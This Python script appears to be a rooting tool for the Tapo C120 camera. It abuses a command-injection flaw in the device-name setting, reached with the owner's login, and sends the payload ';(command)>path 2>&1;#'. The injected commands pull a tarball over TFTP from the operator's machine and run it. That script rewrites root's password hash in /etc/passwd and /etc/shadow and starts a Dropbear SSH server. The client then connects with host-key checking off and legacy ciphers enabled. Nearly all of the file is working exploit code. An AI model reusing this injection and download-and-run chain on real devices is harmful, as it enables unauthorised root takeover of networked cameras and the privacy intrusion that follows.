#!/usr/bin/env python3
"""Stage Dropbear SSH on a local Tapo C120 camera.

"""

from __future__ import annotations

import argparse
import getpass
import hashlib
import io
import os
import re
import secrets
import socket
import struct
import subprocess
import sys
import tarfile
import tempfile
import threading
import time
from pathlib import Path

from tapo_c120_repl import (
    TapoSession,
    fetch_output,
    is_private_target,
    login_with_backoff,
    set_runtime_name,
    sha256_hex,
    trigger_region,
)


OP_RRQ = 1
OP_DATA = 3
OP_ACK = 4
OP_ERROR = 5
TFTP_BLOCK = 512
CRYPT64 = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"


def sh_single_quote(text: str) -> str:
    return "'" + text.replace("'", "'\"'\"'") + "'"


def b64_from_24bit(byte2: int, byte1: int, byte0: int, length: int) -> str:
    value = (byte2 << 16) | (byte1 << 8) | byte0
    out = []
    for _ in range(length):
        out.append(CRYPT64[value & 0x3F])
        value >>= 6
    return "".join(out)


def sha512_crypt(password: str, salt: str, rounds: int = 5000) -> str:
    if not (1000 <= rounds <= 999999999):
        raise ValueError("sha512-crypt rounds must be between 1000 and 999999999")
    if not re.match(r"^[./0-9A-Za-z]{1,16}$", salt):
        raise ValueError("sha512-crypt salt must be 1-16 crypt-base64 characters")

    key = password.encode()
    salt_b = salt.encode()

    alt = hashlib.sha512(key + salt_b + key).digest()
    ctx = hashlib.sha512()
    ctx.update(key)
    ctx.update(salt_b)
    ctx.update((alt * ((len(key) // len(alt)) + 1))[: len(key)])

    count = len(key)
    while count:
        ctx.update(alt if count & 1 else key)
        count >>= 1
    digest = ctx.digest()

    p_bytes = hashlib.sha512(key * len(key)).digest()
    p_bytes = (p_bytes * ((len(key) // len(p_bytes)) + 1))[: len(key)]

    s_bytes = hashlib.sha512(salt_b * (16 + digest[0])).digest()
    s_bytes = (s_bytes * ((len(salt_b) // len(s_bytes)) + 1))[: len(salt_b)]

    for round_index in range(rounds):
        ctx = hashlib.sha512()
        ctx.update(p_bytes if round_index & 1 else digest)
        if round_index % 3:
            ctx.update(s_bytes)
        if round_index % 7:
            ctx.update(p_bytes)
        ctx.update(digest if round_index & 1 else p_bytes)
        digest = ctx.digest()

    order = [
        (0, 21, 42), (22, 43, 1), (44, 2, 23), (3, 24, 45),
        (25, 46, 4), (47, 5, 26), (6, 27, 48), (28, 49, 7),
        (50, 8, 29), (9, 30, 51), (31, 52, 10), (53, 11, 32),
        (12, 33, 54), (34, 55, 13), (56, 14, 35), (15, 36, 57),
        (37, 58, 16), (59, 17, 38), (18, 39, 60), (40, 61, 19),
        (62, 20, 41),
    ]
    encoded = "".join(b64_from_24bit(digest[a], digest[b], digest[c], 4) for a, b, c in order)
    encoded += b64_from_24bit(0, 0, digest[63], 2)

    prefix = "$6$" if rounds == 5000 else f"$6$rounds={rounds}$"
    return f"{prefix}{salt}${encoded}"


def self_test_sha512_crypt() -> None:
    expected = (
        "$6$saltstring$svn8UoSVapNtMuq1ukKS4tPQd8iKwSMHWjl/O817G3uBnIFNjnQJu"
        "esI68u4OTLiBFdcbYEdFCoEOfaS35inz1"
    )
    got = sha512_crypt("Hello world!", "saltstring")
    if got != expected:
        raise AssertionError(f"sha512-crypt self-test failed: {got}")


def tftp_error(sock: socket.socket, addr: tuple[str, int], code: int, message: str) -> None:
    packet = struct.pack("!HH", OP_ERROR, code) + message.encode("ascii", "replace") + b"\0"
    sock.sendto(packet, addr)


def safe_tftp_path(root: Path, requested: str) -> Path | None:
    name = requested.replace("\\", "/").lstrip("/")
    candidate = (root / name).resolve()
    try:
        candidate.relative_to(root)
    except ValueError:
        return None
    return candidate


def serve_tftp_file(sock: socket.socket, root: Path, client_addr: tuple[str, int], request: bytes) -> bool:
    parts = request[2:].split(b"\0")
    if len(parts) < 2:
        return False

    filename = parts[0].decode("utf-8", "replace")
    mode = parts[1].decode("ascii", "replace").lower()
    path = safe_tftp_path(root, filename)

    old_timeout = sock.gettimeout()
    sock.settimeout(2.0)
    try:
        if mode != "octet":
            tftp_error(sock, client_addr, 0, "octet mode only")
            return False
        if path is None or not path.is_file():
            tftp_error(sock, client_addr, 1, "file not found")
            return False

        data = path.read_bytes()
        block_no = 1
        offset = 0
        while True:
            chunk = data[offset : offset + TFTP_BLOCK]
            packet = struct.pack("!HH", OP_DATA, block_no) + chunk
            for _ in range(5):
                sock.sendto(packet, client_addr)
                try:
                    ack, addr = sock.recvfrom(2048)
                except TimeoutError:
                    continue
                if addr == client_addr and len(ack) >= 4 and ack[:4] == struct.pack("!HH", OP_ACK, block_no):
                    break
                if len(ack) >= 4 and struct.unpack("!H", ack[:2])[0] == OP_RRQ:
                    filename = ack[2:].split(b"\0", 1)[0].decode("utf-8", "replace")
                    self_addr = f"{addr[0]}:{addr[1]}"
                    print(f"Ignoring nested TFTP RRQ from {self_addr} for {filename}", flush=True)
            else:
                print(f"TFTP transfer to {client_addr[0]}:{client_addr[1]} timed out at block {block_no}", flush=True)
                return False
            if len(chunk) < TFTP_BLOCK:
                print(f"TFTP sent {path.name} to {client_addr[0]}:{client_addr[1]} ({len(data)} bytes)", flush=True)
                return True
            offset += TFTP_BLOCK
            block_no = (block_no + 1) & 0xFFFF
    finally:
        sock.settimeout(old_timeout)


class TftpServer:
    def __init__(self, root: Path, host: str, port: int):
        self.root = root.resolve()
        self.host = host
        self.port = port
        self.stop_event = threading.Event()
        self.ready_event = threading.Event()
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.error: Exception | None = None
        self.requests: list[tuple[str, int, str]] = []
        self.completed: list[tuple[str, int, str]] = []

    def start(self) -> None:
        self.thread.start()
        if not self.ready_event.wait(3):
            raise RuntimeError("TFTP server did not start")
        if self.error:
            raise self.error

    def stop(self) -> None:
        self.stop_event.set()
        self.thread.join(timeout=2)

    def _run(self) -> None:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.settimeout(0.5)
                sock.bind((self.host, self.port))
                self.ready_event.set()
                while not self.stop_event.is_set():
                    try:
                        request, addr = sock.recvfrom(2048)
                    except TimeoutError:
                        continue
                    if len(request) < 4 or struct.unpack("!H", request[:2])[0] != OP_RRQ:
                        tftp_error(sock, addr, 4, "RRQ only")
                        continue
                    filename = request[2:].split(b"\0", 1)[0].decode("utf-8", "replace")
                    self.requests.append((addr[0], addr[1], filename))
                    print(f"TFTP RRQ from {addr[0]}:{addr[1]} for {filename}", flush=True)
                    if serve_tftp_file(sock, self.root, addr, request):
                        self.completed.append((addr[0], addr[1], filename))
        except Exception as err:
            self.error = err
            self.ready_event.set()


def detect_local_ip_for(target_host: str) -> str:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.connect((target_host, 9))
        return sock.getsockname()[0]


def wait_for_tcp(host: str, port: int, timeout_s: float) -> bool:
    deadline = time.monotonic() + timeout_s
    while time.monotonic() < deadline:
        try:
            with socket.create_connection((host, port), timeout=2):
                return True
        except OSError:
            time.sleep(1)
    return False


def add_tar_file(tar: tarfile.TarFile, arcname: str, data: bytes, mode: int) -> None:
    info = tarfile.TarInfo(arcname)
    info.size = len(data)
    info.mode = mode
    info.mtime = int(time.time())
    tar.addfile(info, io.BytesIO(data))


def make_stage_tar(dropbear_bin: Path, root_hash: str, ssh_port: int, output_dir: Path) -> Path:
    script = f"""#!/bin/sh
cd /tmp || exit 1
echo stage_start >/tmp/dropbear.log
chmod 700 /tmp/d /tmp/a 2>/dev/null || true
ln -sf /tmp/d /tmp/dropbear
ln -sf /tmp/d /tmp/dropbearkey
cp /etc/passwd /tmp/passwd.before_dropbear 2>/dev/null || true
cp /etc/shadow /tmp/shadow.before_dropbear 2>/dev/null || true
h={sh_single_quote(root_hash)}
awk -F: -v h="$h" 'BEGIN{{OFS=":"}} $1=="root"{{$2=h;$6="/root";$7="/bin/ash"}} {{print}}' /etc/passwd >/tmp/passwd.new && cat /tmp/passwd.new >/etc/passwd && echo passwd_updated >>/tmp/dropbear.log || echo passwd_update_failed >>/tmp/dropbear.log
if [ -f /etc/shadow ]; then awk -F: -v h="$h" 'BEGIN{{OFS=":"}} $1=="root"{{$2=h}} {{print}}' /etc/shadow >/tmp/shadow.new && cat /tmp/shadow.new >/etc/shadow && echo shadow_updated >>/tmp/dropbear.log || echo shadow_update_failed >>/tmp/dropbear.log; fi
mkdir -p /root
chmod 700 /root 2>/dev/null || true
killall dropbear 2>/dev/null || true
rm -f /tmp/h
echo generate_hostkey >>/tmp/dropbear.log
/tmp/dropbearkey -t ed25519 -f /tmp/h >>/tmp/dropbear.log 2>&1 || /tmp/dropbearkey -t rsa -f /tmp/h >>/tmp/dropbear.log 2>&1
echo launch_dropbear >>/tmp/dropbear.log
/tmp/dropbear -F -E -r /tmp/h -p {ssh_port} >>/tmp/dropbear.log 2>&1 &
sleep 1
pidof dropbear && echo dropbear_started || (cat /tmp/dropbear.log 2>/dev/null; exit 1)
"""
    tar_path = output_dir / "s"
    with tarfile.open(tar_path, "w:gz") as tar:
        add_tar_file(tar, "d", dropbear_bin.read_bytes(), 0o700)
        add_tar_file(tar, "a", script.encode(), 0o700)
        add_tar_file(tar, "m", b"c120_dropbear_stage\n", 0o644)
    return tar_path


def first_dict_for_key(value, key: str):
    if isinstance(value, dict):
        if isinstance(value.get(key), dict):
            return value[key]
        for child in value.values():
            found = first_dict_for_key(child, key)
            if found is not None:
                return found
    elif isinstance(value, list):
        for child in value:
            found = first_dict_for_key(child, key)
            if found is not None:
                return found
    return None


def first_scalar_for_key(value, key: str) -> str | None:
    if isinstance(value, dict):
        if key in value and not isinstance(value[key], (dict, list)):
            return str(value[key])
        for child in value.values():
            found = first_scalar_for_key(child, key)
            if found is not None:
                return found
    elif isinstance(value, list):
        for child in value:
            found = first_scalar_for_key(child, key)
            if found is not None:
                return found
    return None


def extract_tp_manage_state(response: dict) -> dict[str, str | None]:
    state: dict[str, str | None] = {"dev_name": None, "factory_enabled": None}
    tp_manage = first_dict_for_key(response, "tp_manage")
    if not tp_manage:
        return state

    info = tp_manage.get("info")
    if isinstance(info, dict) and "dev_name" in info:
        state["dev_name"] = str(info["dev_name"])

    factory_mode = tp_manage.get("factory_mode")
    if isinstance(factory_mode, dict):
        if "enabled" in factory_mode:
            state["factory_enabled"] = str(factory_mode["enabled"])
        elif isinstance(factory_mode.get("factory_mode"), dict) and "enabled" in factory_mode["factory_mode"]:
            state["factory_enabled"] = str(factory_mode["factory_mode"]["enabled"])
    return state


def read_original_runtime_state(session: TapoSession) -> dict[str, str]:
    response = session.secure_request({
        "method": "get",
        "tp_manage": {"name": ["info", "factory_mode"]},
    })
    state = extract_tp_manage_state(response)

    if state["dev_name"] is None:
        for request in (
            {"method": "getInfo", "params": {"infoMask": 65535}},
            {"method": "getInfo", "params": {"infoMask": "65535"}},
            {"method": "getInfo", "tp_manage": {"infoMask": 65535}},
            {"method": "getInfo"},
        ):
            try:
                info_response = session.secure_request(request)
            except Exception:
                continue
            dev_name = first_scalar_for_key(info_response, "dev_name")
            if dev_name is not None:
                state["dev_name"] = dev_name
                break

    missing = [name for name, value in state.items() if value is None]
    if missing:
        raise RuntimeError(
            "Could not read original "
            + ", ".join(missing)
            + "; refusing to stage so the script does not restore guessed values."
        )
    return {"dev_name": state["dev_name"] or "", "factory_enabled": state["factory_enabled"] or "0"}


def restore_runtime_state(session: TapoSession, state: dict[str, str]) -> None:
    session.secure_request({
        "method": "multipleRequest",
        "params": {
            "requests": [{
                "method": "setLedStatus",
                "params": {
                    "tp_manage": {
                        "info": {"dev_name": state["dev_name"]},
                        "factory_mode": {"enabled": state["factory_enabled"]},
                    }
                },
            }]
        },
    })


def exec_short(
    host: str,
    session: TapoSession,
    command: str,
    output_path: str,
    region: str,
    restore_state: dict[str, str],
    timeout_s: float,
    debug_payload: bool,
    done_check=None,
) -> str:
    if not output_path.startswith("/tmp/") or not re.match(r"^/tmp/[A-Za-z0-9._-]+$", output_path):
        raise ValueError("Output path must be a simple /tmp filename.")
    if re.search(r"[\r\n\0]", command):
        raise ValueError("Command must be single-line.")

    payload = f";({command})>{output_path} 2>&1;#"
    if debug_payload:
        print(f"[payload {len(payload)} bytes] {payload}", file=sys.stderr)
    set_runtime_name(session, payload, True)
    time.sleep(0.2)
    trigger_region(session, region)

    deadline = time.monotonic() + timeout_s
    text = ""
    try:
        while time.monotonic() < deadline:
            if done_check and done_check():
                return ""
            text = fetch_output(host, session, output_path)
            if text:
                return text
            time.sleep(0.2)
        return text
    finally:
        try:
            restore_runtime_state(session, restore_state)
        except BaseException:
            pass


def exec_with_region_retry(
    host: str,
    session: TapoSession,
    command: str,
    output_prefix: str,
    preferred_region: str,
    restore_state: dict[str, str],
    timeout_s: float,
    debug_payload: bool,
    done_check=None,
) -> str:
    regions = [preferred_region, "ZY" if preferred_region == "ZZ" else "ZZ"]
    last_output = ""
    for attempt, region in enumerate(regions, start=1):
        output = exec_short(
            host=host,
            session=session,
            command=command,
            output_path=f"{output_prefix}{attempt}",
            region=region,
            restore_state=restore_state,
            timeout_s=timeout_s,
            debug_payload=debug_payload,
            done_check=done_check,
        )
        if output.strip():
            return output
        last_output = output
    return last_output


def fetch_remote_text(host: str, session: TapoSession, path: str, limit: int = 2000) -> str:
    try:
        text = fetch_output(host, session, path).strip()
    except Exception as err:
        return f"[fetch {path} failed: {err}]"
    if len(text) > limit:
        return text[:limit] + f"\n[truncated {len(text) - limit} chars]"
    return text


def prompt_path(prompt: str) -> Path:
    while True:
        value = input(prompt).strip().strip('"')
        if value:
            path = Path(value).expanduser()
            if path.is_file():
                return path
        print("Please enter a path to an existing file.")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Stage Dropbear SSH on a local Tapo C120 camera.")
    parser.add_argument("--host", help="Target Tapo camera IP/host. Prompts if omitted.")
    parser.add_argument("--user", help="Tapo username. Prompts if omitted.")
    parser.add_argument("--dropbear-bin", help="ARM dropbear or dropbearmulti binary to stage. Defaults to dropbearmulti-armhf next to this script when present.")
    parser.add_argument("--tftp-host", help="Local interface IP the camera can reach. Auto-detected if omitted.")
    parser.add_argument("--tftp-port", type=int, default=69, help="Local TFTP UDP port. Camera command assumes port 69.")
    parser.add_argument("--ssh-port", type=int, default=2222, help="Dropbear listen port on the camera.")
    parser.add_argument("--debug-payload", action="store_true", help="Print injected bootstrap payloads.")
    parser.add_argument("--no-ssh", action="store_true", help="Stage Dropbear but do not launch the local SSH client.")
    parser.add_argument("--keep-stage", action="store_true", help="Keep the temporary TFTP stage directory for debugging.")
    parser.add_argument("--self-test", action="store_true", help=argparse.SUPPRESS)
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    self_test_sha512_crypt()
    if args.self_test:
        print("Self-test passed")
        return 0
    if args.tftp_port != 69:
        raise RuntimeError("The camera-side TFTP client uses the default UDP port 69; --tftp-port must be 69.")

    host = args.host or input("Camera IP/host: ").strip()
    username = args.user or input("Tapo username: ").strip()
    if not host or not is_private_target(host):
        raise RuntimeError("Refusing to target a non-private host.")
    if not username:
        raise RuntimeError("Tapo username is required.")

    default_dropbear = Path(__file__).resolve().parent / "dropbearmulti-armhf"
    dropbear_bin = Path(args.dropbear_bin).expanduser() if args.dropbear_bin else default_dropbear
    if dropbear_bin is None or not dropbear_bin.is_file():
        dropbear_bin = prompt_path("Path to ARM dropbear/dropbearmulti binary: ")
    if dropbear_bin.read_bytes()[:4] != b"\x7fELF":
        raise RuntimeError(f"{dropbear_bin} does not look like an ELF binary.")

    password = getpass.getpass("Tapo password, also used for root SSH: ")
    if not password:
        raise RuntimeError("Password cannot be empty.")

    tftp_host = args.tftp_host or detect_local_ip_for(host)
    token = secrets.token_hex(2)
    root_hash = sha512_crypt(password, f"c120{token}", rounds=5000)
    pwd_hash = sha256_hex(password)

    print(f"Logging in to {host} as {username}...")
    login = login_with_backoff(host, username, pwd_hash)
    session = TapoSession(host, pwd_hash, login)
    restore_state = read_original_runtime_state(session)
    print(
        "Original tp_manage state: "
        f"dev_name={restore_state['dev_name']!r}, "
        f"factory_mode.enabled={restore_state['factory_enabled']!r}"
    )

    temp_ctx = tempfile.TemporaryDirectory(prefix="c120_dropbear_")
    stage_dir = Path(temp_ctx.name)
    try:
        make_stage_tar(dropbear_bin, root_hash, args.ssh_port, stage_dir)
        server = TftpServer(stage_dir, "0.0.0.0", args.tftp_port)
        server.start()
        print(f"Serving stage bundle from {stage_dir} over TFTP {tftp_host}:{args.tftp_port}")

        regions = ["ZZ", "ZY", "ZZ"]
        commands = [
            f"tftp -g -r s -l /tmp/s {tftp_host};echo rc:$?",
            "cd /tmp&&tar xzf s&&chmod +x d a;echo rc:$?",
            "cd /tmp&&sh a&&echo ok",
        ]
        command_timeouts = [12, 4, 8]
        port_confirmed = False
        for index, command in enumerate(commands, start=1):
            completed_before = len(server.completed)
            if index == 1:
                output = exec_short(
                    host=host,
                    session=session,
                    command=command,
                    output_path=f"/tmp/d{token}{index}1",
                    region=regions[index - 1],
                    restore_state=restore_state,
                    timeout_s=command_timeouts[index - 1],
                    debug_payload=args.debug_payload,
                    done_check=lambda: len(server.completed) > completed_before,
                ).strip()
                completed_after = len(server.completed)
                if not output and completed_after == completed_before:
                    output = exec_short(
                        host=host,
                        session=session,
                        command=command,
                        output_path=f"/tmp/d{token}{index}2",
                        region="ZY" if regions[index - 1] == "ZZ" else "ZZ",
                        restore_state=restore_state,
                        timeout_s=command_timeouts[index - 1],
                        debug_payload=args.debug_payload,
                        done_check=lambda: len(server.completed) > completed_before,
                    ).strip()
            else:
                output = exec_with_region_retry(
                    host=host,
                    session=session,
                    command=command,
                    output_prefix=f"/tmp/d{token}{index}",
                    preferred_region=regions[index - 1],
                    restore_state=restore_state,
                    timeout_s=command_timeouts[index - 1],
                    debug_payload=args.debug_payload,
                ).strip()
            completed_after = len(server.completed)
            if index == 1 and not output and completed_after > completed_before:
                output = "rc:0 (TFTP transfer completed)"
            print(f"[{index}/3] {output or 'no output'}")
            if not output:
                if index == 1 and not server.requests:
                    print("No TFTP request reached this computer; check Windows firewall or pass --tftp-host with the reachable LAN IP.")
                if index == 2:
                    marker = fetch_remote_text(host, session, "/tmp/m", limit=200).strip()
                    if marker == "c120_dropbear_stage":
                        print("Tar extraction confirmed by /tmp/m marker.")
                        continue
                    print("Tar extraction marker missing; /tmp/m fetch:")
                    print(marker or "(blank)")
                    raise RuntimeError(f"Bootstrap command {index} produced no output and extraction was not confirmed.")
                if index == 3 and wait_for_tcp(host, args.ssh_port, 5):
                    print(f"SSH port {args.ssh_port} is open.")
                    port_confirmed = True
                    break
                if index == 3:
                    print("----- /tmp/dropbear.log -----")
                    print(fetch_remote_text(host, session, "/tmp/dropbear.log") or "(no log output)")
                    print("----- end log -----")
                raise RuntimeError(f"Bootstrap command {index} produced no output.")
            if "No such file" in output or "not found" in output or "Permission denied" in output:
                raise RuntimeError(f"Bootstrap command failed: {output}")
            if index < 3 and "rc:0" not in output:
                raise RuntimeError(f"Bootstrap command {index} did not confirm completion: {output}")
            if index == 3 and "dropbear_started" not in output:
                if "ok" in output:
                    port_confirmed = True
                    break
                if wait_for_tcp(host, args.ssh_port, 5):
                    print(f"SSH port {args.ssh_port} is open.")
                    port_confirmed = True
                    break
                raise RuntimeError(f"Dropbear did not confirm startup: {output}")

        if not port_confirmed and not wait_for_tcp(host, args.ssh_port, 3):
            print("----- /tmp/dropbear.log -----")
            print(fetch_remote_text(host, session, "/tmp/dropbear.log") or "(no log output)")
            print("----- end log -----")
            raise RuntimeError(f"Dropbear startup did not leave TCP port {args.ssh_port} open.")

        print(f"Dropbear is listening on {host}:{args.ssh_port}")
        if not args.no_ssh:
            print("Opening SSH as root. Use the same Tapo password when OpenSSH prompts.")
            ssh_cmd = [
                "ssh",
                "-p",
                str(args.ssh_port),
                "-o", "PreferredAuthentications=password,keyboard-interactive",
                "-o", "PubkeyAuthentication=no",
                "-o", "NumberOfPasswordPrompts=3",
                "-o", "StrictHostKeyChecking=no",
                "-o", f"UserKnownHostsFile={os.devnull}",
                "-o", "KexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1",
                "-o", "HostKeyAlgorithms=+ssh-rsa",
                "-o", "Ciphers=+aes128-cbc,3des-cbc",
                f"root@{host}",
            ]
            ssh_rc = subprocess.call(ssh_cmd)
            if ssh_rc:
                print(f"SSH exited with code {ssh_rc}; fetching /tmp/dropbear.log...")
                log = fetch_remote_text(host, session, "/tmp/dropbear.log").strip()
                print("----- /tmp/dropbear.log -----")
                print(log or "(no log output)")
                print("----- end log -----")
            return ssh_rc
        return 0
    finally:
        try:
            server.stop()
        except Exception:
            pass
        if args.keep_stage:
            print(f"Kept stage directory: {stage_dir}")
        else:
            temp_ctx.cleanup()


if __name__ == "__main__":
    raise SystemExit(main())
